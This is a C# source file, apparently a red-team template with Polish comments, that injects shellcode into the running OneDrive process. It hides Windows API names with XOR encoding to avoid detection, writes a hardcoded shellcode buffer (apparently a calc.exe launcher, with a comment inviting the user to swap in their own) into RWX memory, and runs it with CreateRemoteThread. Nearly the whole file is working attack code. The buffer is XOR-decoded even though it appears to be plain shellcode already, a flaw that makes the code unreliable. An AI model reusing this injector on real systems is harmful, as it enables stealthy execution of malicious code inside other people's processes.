using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpInjectProcess
{

    public class Program
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // VirtualAlloc
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // CreateThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // WaitForSingleObject
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

        // OpenProcess
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        // VirtualAllocEx
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // WriteProcessMemory
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool Type_WriteProcessMemory(IntPtr hprocess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // CreateRemoteThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddresss, IntPtr lpParameter, uint DwCreationFlags, out IntPtr lpThreadId );

        // MessageBox
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_MessageBox(IntPtr hWnd, String text, String caption, uint type);


        // Ponizej funkcja o nazwie addworkstation ktora przyjmuje zaxorowany strumien bajtow, odxorowuje go i zwraca string
        public static string addworkstation(byte[] data)
        {
            byte[] adduser = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                adduser[i] = (byte)(data[i] ^ 0xa0);
            }
            return Encoding.Default.GetString(adduser);
        }


        public static void Execute()
        {
            const uint DELETE = 0x00010000;
            const uint READ_CONTROL = 0x00020000;
            const uint WRITE_DAC = 0x00040000;
            const uint WRITE_OWNER = 0x00080000;
            const uint SYNCHRONIZE = 0x00100000;
            const uint END = 0xFFF;
            const uint PROCESS_ALL_ACCESS = (DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END);

            // Ponizej Twoj shellcode!
            byte[] buf = new byte[276]{   0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
            };


            int buflen = buf.Length + 1;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            // Zaladowanie biblioteki user32.dll i kernel32.dll
            string user32dll = "user32.dll";
            string kernel32dll = "kernel32.dll";
            IntPtr huser32dll = LoadLibrary(user32dll);
            IntPtr hkernel32dll = LoadLibrary(kernel32dll);

            // Znalezienie wskaznika na funkcje MessageBoxA
            //string strMessageBox = "MessageBoxA";
            //IntPtr hMessageBox = GetProcAddress(huser32dll, strMessageBox);
            //Type_MessageBox mb = (Type_MessageBox)Marshal.GetDelegateForFunctionPointer(hMessageBox, typeof(Type_MessageBox));
            //mb(IntPtr.Zero, "Siemanko", "dupka", 0);


            // znalezienie wskaznika na OpenProcess i zdefiniowanie open process
            byte[] e_op = { 0xef, 0xd0, 0xc5, 0xce, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3 };
            IntPtr hOpenProcess = GetProcAddress(hkernel32dll, addworkstation(e_op));   
            Type_OpenProcess op = (Type_OpenProcess)Marshal.GetDelegateForFunctionPointer(hOpenProcess, typeof(Type_OpenProcess));

            // znalezienie wskaznika na VirtualAllocEx i zdefiniowanie VirtualAllocEx
            byte[] e_vax = { 0xf6, 0xc9, 0xd2, 0xd4, 0xd5, 0xc1, 0xcc, 0xe1, 0xcc, 0xcc, 0xcf, 0xc3, 0xe5, 0xd8 };
            IntPtr hVirtualAllocEx = GetProcAddress(hkernel32dll , addworkstation(e_vax));
            Type_VirtualAllocEx vax = (Type_VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(hVirtualAllocEx, typeof(Type_VirtualAllocEx));


            // Znalezienie wskaznikana WriteProcessMemory i zdefiniowanie WriteProcessMemory
            byte[] e_wpm = { 0xf7, 0xd2, 0xc9, 0xd4, 0xc5, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3, 0xed, 0xc5, 0xcd, 0xcf, 0xd2, 0xd9 };
            IntPtr hWritePricessMemory = GetProcAddress(hkernel32dll, addworkstation(e_wpm));
            Type_WriteProcessMemory wpm = (Type_WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(hWritePricessMemory, typeof(Type_WriteProcessMemory));


            // Znalezienie Wskaznika na CreateRemoteThread i zdefiniowanie CreateRemoteThread
            byte[] e_crm = { 0xe3, 0xd2, 0xc5, 0xc1, 0xd4, 0xc5, 0xf2, 0xc5, 0xcd, 0xcf, 0xd4, 0xc5, 0xf4, 0xc8, 0xd2, 0xc5, 0xc1, 0xc4 };
            IntPtr hCreateRemoteThread = GetProcAddress(hkernel32dll, addworkstation(e_crm));
            Type_CreateRemoteThread crt = (Type_CreateRemoteThread)Marshal.GetDelegateForFunctionPointer(hCreateRemoteThread, typeof(Type_CreateRemoteThread));

            // Tu wpisz do jakiego procesu chcesz wstrzyknac ShellCode
            Process[] processes = Process.GetProcessesByName("OneDrive");
            int pid = processes[0].Id;

            IntPtr prochandle = op(PROCESS_ALL_ACCESS, false, (uint)pid);
            IntPtr memaddr = vax(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40);
            //int bytesWritten = 0;
            wpm(prochandle, memaddr, buf, buflen, out var bytesWritten);
            IntPtr hcrt = crt(prochandle, IntPtr.Zero, 0, memaddr, IntPtr.Zero, 0, out var lpThreadId);
            

        }

        public static void Main(string[] args)
        {
            Execute();
        }
    }
}
